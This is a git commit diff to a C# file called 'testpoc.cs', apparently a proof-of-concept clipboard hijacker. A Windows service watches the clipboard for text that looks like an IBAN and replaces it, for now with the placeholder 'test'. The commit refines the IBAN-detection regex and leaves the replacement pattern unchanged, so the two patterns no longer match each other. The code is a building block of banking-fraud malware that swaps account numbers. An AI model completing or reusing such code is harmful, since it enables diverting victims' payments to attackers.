43017a17e5cee569de7cb1a6074d7b4a5e377805
fab <59584067+FabFromTheSnow@users.noreply.github.com>
2024-03-14 17:56:35 +0100

    Update testpoc.cs

--- IbanChange/testpoc.cs
+++ IbanChange/testpoc.cs
@@ -31,7 +31,7 @@ public class ClipboardMonitorService : ServiceBase
             string clipboardText = Clipboard.GetText();
 
             // Check if clipboard text matches the regex pattern
-            if (Regex.IsMatch(clipboardText, @"^(?:[A-Z]{2})(?:(?![a-zA-Z0-9]{2}\b)\w){2,30}$", RegexOptions.IgnoreCase))
+            if (Regex.IsMatch(clipboardText, @"^(?:[A-Z]{2}\s*\d{2}\s*(?=(?:\w{4}\s*){2,7}\w{1,4}\s*$)[\w\s]{4,32})$", RegexOptions.IgnoreCase))
             {
                 // Replace the pattern with "test"
                 clipboardText = Regex.Replace(clipboardText, @"^(?:[A-Z]{2})(?:(?![a-zA-Z0-9]{2}\b)\w){2,30}$", "test", RegexOptions.IgnoreCase);
